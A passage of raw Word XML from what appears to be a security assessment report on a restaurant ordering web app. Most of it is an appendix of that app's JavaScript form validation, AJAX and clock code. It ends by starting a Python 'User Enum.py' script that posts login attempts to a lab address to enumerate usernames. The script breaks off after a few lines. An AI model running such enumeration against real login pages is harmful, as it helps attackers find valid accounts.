    </w:p>
    <w:p w14:paraId="0E9C673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addValidationMessage(msg);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="213174C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addValidationField(cur_field)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0159425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displayErrorInfo( form );</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5853EEB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return;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="26F9787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4B8E281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total += parseFloat(cur_field.value) * parseFloat( form.elements[ PRODUCT_ABBRS[i] + "_price" ].value );</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="27A4FE8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7FC56AC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form.elements['total'].value = formatDecimal(total);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="539DC65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6CF734A" w14:textId="77777777" w:rsidR="00C3556C" w:rsidRPr="00C3556C" w:rsidRDefault="00C3556C" w:rsidP="00C3556C">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3F86BCB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orderform</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2F039D3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finalCheck(orderForm) {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="38B318C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validationVerified=true;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="49CB57C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18F41975" w14:textId="77777777" w:rsidR="00C3556C" w:rsidRPr="00C3556C" w:rsidRDefault="00C3556C" w:rsidP="00C3556C">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="67816A0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(orderForm.quantity.value=="")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6ACC93A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549986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quantity.\n";</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="33698C4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733845B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0D7F60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(orderForm.quantity.value==0)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0805E4A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5209A8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quantity rather than 0.\n";</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2ED5F78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186BE6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942672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if(orderForm.total.value=="")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="537B394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952106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errorMessage+="Total has not been calculated! Please provide first the quantity.\n";</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1C4CC3B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47FD446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A3720F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0FF8073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938680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43FC634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478BF1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674755E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6B67CFE" w14:textId="77777777" w:rsidR="00C3556C" w:rsidRPr="00C3556C" w:rsidRDefault="00C3556C" w:rsidP="00C3556C">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="11E5F77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updateForm</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3E5345E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updateValidate(updateForm) {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1BACA4A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validationVerified=true;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="493655D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44870C04" w14:textId="77777777" w:rsidR="00C3556C" w:rsidRPr="00C3556C" w:rsidRDefault="00C3556C" w:rsidP="00C3556C">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0BE4CE2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(updateForm.opassword.value=="")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="63C623D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35A796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your old password.\n";</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="00F02D0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18FC196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A6705D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(updateForm.npassword.value=="")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7D57FFC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3FB6DD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new password.\n";</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4FB271F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0BCA801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w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="72A10C7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if(updateForm.cpassword.value=="")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2768BCE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822B05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confirm your new password.\n";</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="65D3168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E14F44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4EBB4C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if(updateForm.cpassword.value!=updateForm.npassword.value)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5182719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44C4BA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errorMessage+="Confirm Password and New Password do not match!\n";</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E0010E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73962F3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39DFFA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3F65D68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0E3D49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7F6016C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4577DC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4B821EA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9DFC0B1" w14:textId="77777777" w:rsidR="00C3556C" w:rsidRPr="00C3556C" w:rsidRDefault="00C3556C" w:rsidP="00C3556C">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="77F02B1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billingForm</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="53B183D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billingValidate(billingForm) {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5C1CC12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validationVerified=true;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="562BB9E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6687DBF6" w14:textId="77777777" w:rsidR="00C3556C" w:rsidRPr="00C3556C" w:rsidRDefault="00C3556C" w:rsidP="00C3556C">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="050E4EA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(billingForm.sAddress.value=="")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="10ED025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F7E8B2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street address.\n";</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="64AC698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455A03B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94E485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(billingForm.box.value=="")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B3B2EC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87DEF4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your postal box number.\n";</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4250EA4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3538992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7596F6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(billingForm.city.value=="")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1D1469C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32B1EE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your city.\n";</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="184D90C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72B8351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FD913B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if(billingForm.mNumber.value=="")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="65D6FA9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359921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your mobile number.\n";</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1E4708A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262499C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52C6BB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742C3D9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042BC7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7B45048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1CAE2E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7F70163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A11AC81" w14:textId="77777777" w:rsidR="00C3556C" w:rsidRPr="00C3556C" w:rsidRDefault="00C3556C" w:rsidP="00C3556C">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6313870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table form</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7F304A9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tableValidate(tableForm){</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7AAB943E" w14:textId="77777777" w:rsidR="00C3556C" w:rsidRPr="00C3556C" w:rsidRDefault="00C3556C" w:rsidP="00C3556C">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="236310A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2A8383F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126A0FF2" w14:textId="77777777" w:rsidR="00C3556C" w:rsidRPr="00C3556C" w:rsidRDefault="00C3556C" w:rsidP="00C3556C">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="09F2646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(tableForm.table.selectedIndex==0)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="33025A5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C50D22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errorMessage+="Please select a table by its name or number.\n";</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="439A5F5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144818D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CECFB1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(tableForm.date.value=="")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1A689FA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AC1B9C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reservation date.\n";</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="35003D7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543C17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362095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(tableForm.time.value=="")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="130DF66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9B36B9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reservation time.\n";</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="13328DD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1577533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DC0E32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0BD6945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20603F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7BD3925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EA3065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4F377B3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E7FDD8E" w14:textId="77777777" w:rsidR="00C3556C" w:rsidRPr="00C3556C" w:rsidRDefault="00C3556C" w:rsidP="00C3556C">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2A6356D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partyhall form</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="40086B0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partyhallValidate(partyhallForm){</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1DFE9FFF" w14:textId="77777777" w:rsidR="00C3556C" w:rsidRPr="00C3556C" w:rsidRDefault="00C3556C" w:rsidP="00C3556C">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4C4CB2C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3574796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50615155" w14:textId="77777777" w:rsidR="00C3556C" w:rsidRPr="00C3556C" w:rsidRDefault="00C3556C" w:rsidP="00C3556C">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="407A149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(partyhallForm.partyhall.selectedIndex==0)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="26743E6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48B61B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select a partyhall by its name or number.\n";</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="02318BD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41CDA9F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9FD544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(partyhallForm.date.value=="")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5697DEF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B51B77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reservation date.\n";</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="28F9501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7F824AB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479F9F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(partyhallForm.time.value=="")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="167779A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083F93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provide a reservation time.\n";</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="61FC166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1EF5724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92EA7F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1DEED78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ECFD26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35C78A4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3102C3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5E7E22A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8057D73" w14:textId="77777777" w:rsidR="00C3556C" w:rsidRPr="00C3556C" w:rsidRDefault="00C3556C" w:rsidP="00C3556C">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="75AA718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categories form</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="26D13BB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categoriesValidate(categoriesForm){</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="43EC3A23" w14:textId="77777777" w:rsidR="00C3556C" w:rsidRPr="00C3556C" w:rsidRDefault="00C3556C" w:rsidP="00C3556C">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="587F311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228A700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33F7C8DB" w14:textId="77777777" w:rsidR="00C3556C" w:rsidRPr="00C3556C" w:rsidRDefault="00C3556C" w:rsidP="00C3556C">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="43E1420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(categoriesForm.category.selectedIndex==0)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="33AE5FB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39B5F5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select a category first!\n";</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3AA4DD8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61D4415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w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="26DC702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71C6E95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6F3C89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0164067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5594F4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7E42881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96CD6EA" w14:textId="77777777" w:rsidR="00C3556C" w:rsidRPr="00C3556C" w:rsidRDefault="00C3556C" w:rsidP="00C3556C">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3F7DBE2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quantity form</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="55F3B9C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updateQuantity(quantityForm){</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="022ACD35" w14:textId="77777777" w:rsidR="00C3556C" w:rsidRPr="00C3556C" w:rsidRDefault="00C3556C" w:rsidP="00C3556C">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3F0F096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3EE963A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1AA0F255" w14:textId="77777777" w:rsidR="00C3556C" w:rsidRPr="00C3556C" w:rsidRDefault="00C3556C" w:rsidP="00C3556C">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2B7D799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(quantityForm.item.selectedIndex==0)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="07AED0C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88D29B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select an item id first!\n";</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3A86BBE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5DE480D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2306B3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(quantityForm.quantity.selectedIndex==0)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="368ECB8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F2358C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select a quantity first!\n";</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A12B15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2A2A8D5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D7DB6B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1AD7A8C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E73B94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1896EB5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0CE9A8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410B22E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346ED7B" w14:textId="77777777" w:rsidR="00C3556C" w:rsidRPr="00C3556C" w:rsidRDefault="00C3556C" w:rsidP="00C3556C">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3311614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//validate rating form</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3CCE83B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ratingValidate(ratingForm){</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="59A0CF69" w14:textId="77777777" w:rsidR="00C3556C" w:rsidRPr="00C3556C" w:rsidRDefault="00C3556C" w:rsidP="00C3556C">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0941E29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validationVerified=true;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3F9F50F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var errorMessage="";</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5DF2DD57" w14:textId="77777777" w:rsidR="00C3556C" w:rsidRPr="00C3556C" w:rsidRDefault="00C3556C" w:rsidP="00C3556C">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="49222DD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(ratingForm.food.selectedIndex==0)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3F4680A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EC1784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select the food. This information is necessary in order to serve you better.\n";</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2F311DAE"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0A4C71C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31B5C9C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 (ratingForm.scale.selectedIndex==0)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="260A425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729ED64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errorMessage+="Please select the scale. This information is necessary in order to serve you better.\n";</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="528FF647"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validationVerified=false;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="77E7E58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165D167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if(!validationVerified)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C3332C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2330304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alert(errorMessage);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0AB8AC7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69BC620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return validationVerified;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7B09DE3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49DDF5C" w14:textId="77777777" w:rsidR="00C3556C" w:rsidRPr="00C3556C" w:rsidRDefault="00C3556C" w:rsidP="00C3556C">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="778E931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//reset password popup</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="33AD4B1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function resetPassword()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1A27AA9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7EC95EB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lastRenderedPageBreak/>
        <w:t>window.open('password-reset.php','resetPassword','toolbar=no,location=no,directories=no,status=no,menubar=no,resizable=no,copyhistory=no,scrollbars=yes,width=480,height=320');</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0E4475B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7364CD7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7D2B1BD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//validates quantity and redirects quantity to update-quantity.php</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="79D8814A"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getQuantity(int)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="01E4E0E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4494E2D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if (window.XMLHttpRequest)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1ECF6C0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code for IE7+, Firefox, Chrome, Opera, Safari</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="166F7D0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xmlhttp=new XMLHttpRequest();</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E1BD8B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1D550121"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else</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6119080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code for IE6, IE5</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1855175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xmlhttp=new ActiveXObject("Microsoft.XMLHTTP");</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="136CF338"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w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="55BB6EEE" w14:textId="77777777" w:rsidR="00C3556C" w:rsidRPr="00C3556C" w:rsidRDefault="00C3556C" w:rsidP="00C3556C">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="129B742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xmlhttp.open("GET","update-quantity.php?quantity_id="+int,true);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="70C3F83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xmlhttp.send();</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2917814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05C8168E" w14:textId="77777777" w:rsidR="00C3556C" w:rsidRPr="00C3556C" w:rsidRDefault="00C3556C" w:rsidP="00C3556C">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6816062C"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//live clock function</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2FF7B5D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function updateClock ( )</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4D084D4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28A6C6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currentTime = new Date ( );</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="236D4E56" w14:textId="77777777" w:rsidR="00C3556C" w:rsidRPr="00C3556C" w:rsidRDefault="00C3556C" w:rsidP="00C3556C">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="33630572"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currentHours = currentTime.getHours ( );</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="78D4B5D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currentMinutes = currentTime.getMinutes ( );</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1350C14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currentSeconds = currentTime.getSeconds ( );</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1C12FE2F" w14:textId="77777777" w:rsidR="00C3556C" w:rsidRPr="00C3556C" w:rsidRDefault="00C3556C" w:rsidP="00C3556C">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1FAE188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Pad the minutes and seconds with leading zeros, if required</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="74F0E45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currentMinutes = ( currentMinutes &lt; 10 ? "0" : "" ) + currentMinutes;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5875A96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currentSeconds = ( currentSeconds &lt; 10 ? "0" : "" ) + currentSeconds;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="34F0207E" w14:textId="77777777" w:rsidR="00C3556C" w:rsidRPr="00C3556C" w:rsidRDefault="00C3556C" w:rsidP="00C3556C">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7B1B605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Choose either "AM" or "PM" as appropriate</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="644B7F8F"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timeOfDay = ( currentHours &lt; 12 ) ? "AM" : "PM";</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3F697355" w14:textId="77777777" w:rsidR="00C3556C" w:rsidRPr="00C3556C" w:rsidRDefault="00C3556C" w:rsidP="00C3556C">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4B7A4A50"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Convert the hours component to 12-hour format if needed</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2D81AF03"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currentHours = ( currentHours &gt; 12 ) ? currentHours - 12 : currentHours;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6323D8A9" w14:textId="77777777" w:rsidR="00C3556C" w:rsidRPr="00C3556C" w:rsidRDefault="00C3556C" w:rsidP="00C3556C">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="713BABAD"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Convert an hours component of "0" to "12"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1935F559"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currentHours = ( currentHours == 0 ) ? 12 : currentHours;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="46122795" w14:textId="77777777" w:rsidR="00C3556C" w:rsidRPr="00C3556C" w:rsidRDefault="00C3556C" w:rsidP="00C3556C">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4185473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Compose the string for display</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3109B26B"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var currentTimeString = currentHours + ":" + currentMinutes + ":" + currentSeconds + " " + timeOfDay;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5C0E7781" w14:textId="77777777" w:rsidR="00C3556C" w:rsidRPr="00C3556C" w:rsidRDefault="00C3556C" w:rsidP="00C3556C">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="320B7864"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 Update the time display</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7D1656B6"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 xml:space="preserve">  document.getElementById("clock").innerHTML = currentTimeString;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5D0981C5" w14:textId="77777777" w:rsidR="00C3556C" w:rsidRPr="00C3556C" w:rsidRDefault="00C3556C" w:rsidP="00C3556C">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C3556C">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="50C453EF" w14:textId="77777777" w:rsidR="00C3556C" w:rsidRDefault="00C3556C" w:rsidP="00C3556C">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="16D4CAD9" w14:textId="77777777" w:rsidR="00C3556C" w:rsidRDefault="001D0209" w:rsidP="008641AC">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="67" w:name="_Toc58836616"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>4.1</w:t>
      </w:r>
      <w:r w:rsidR="00CC7382">
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> User Enum.py</w:t>
      </w:r>
      <w:bookmarkEnd w:id="67"/>
    </w:p>
    <w:p w14:paraId="7C76A432" w14:textId="77777777" w:rsidR="00CC7382" w:rsidRDefault="00CC7382" w:rsidP="00CC7382">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t># -*- coding: utf-8 -*-</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6E86094C" w14:textId="77777777" w:rsidR="00CC7382" w:rsidRDefault="00CC7382" w:rsidP="00CC7382">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="271FA19F" w14:textId="77777777" w:rsidR="00CC7382" w:rsidRDefault="00CC7382" w:rsidP="00CC7382">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>import requests</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="038811BB" w14:textId="77777777" w:rsidR="00CC7382" w:rsidRDefault="00CC7382" w:rsidP="00CC7382">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="161CD28E" w14:textId="77777777" w:rsidR="00CC7382" w:rsidRDefault="00CC7382" w:rsidP="00CC7382">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>url = 'http://192.168.1.20/login-exec.php'</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6AC65E16" w14:textId="77777777" w:rsidR="00CC7382" w:rsidRDefault="00CC7382" w:rsidP="00CC7382">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>myobj = { 'login': 'bbbb', 'password': '', 'Submit': 'Login' }</w:t>
      </w:r>
    </w:p>
